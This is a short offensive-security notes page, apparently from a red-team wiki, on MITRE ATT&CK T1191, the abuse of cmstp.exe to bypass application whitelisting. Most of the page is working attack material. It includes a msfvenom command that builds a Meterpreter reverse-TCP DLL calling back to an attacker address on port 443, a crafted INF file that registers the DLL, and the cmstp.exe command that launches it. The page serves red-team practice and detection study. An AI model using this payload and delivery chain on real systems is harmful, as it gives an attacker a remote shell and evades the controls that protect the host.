---
description: Bypass application whitelisting.
---

# T1191: CSMTP Code Execution

## Code

{% code-tabs %}
{% code-tabs-item title="evil.dll" %}
```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="f.inf" %}
```scheme
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\experiments\cmstp\evil.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Execution

```bash
PS C:\experiments\cmstp> cmstp.exe /s .\f.inf
```

## Observations

Rundll32 is sapwned which then establishes a connection back to the attacker:

![](../.gitbook/assets/cmstp-rundll32.png)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1191\",\"type\":\"link\",\"title\":\"CMSTP - ATT&CK for Enterprise\"}" %}

{% embed data="{\"url\":\"https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/\",\"type\":\"link\",\"title\":\"AppLocker Bypass – CMSTP\",\"description\":\"CMSTP is a binary which is associated with the Microsoft Connection Manager Profile Installer. It accepts INF files which can be weaponised with malicious commands in order to execute arbitrary cod…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://pentestlab.files.wordpress.com/2018/05/cmstp-metasploit-multi-handler.png\",\"width\":707,\"height\":318,\"aspectRatio\":0.4497878359264498}}" %}

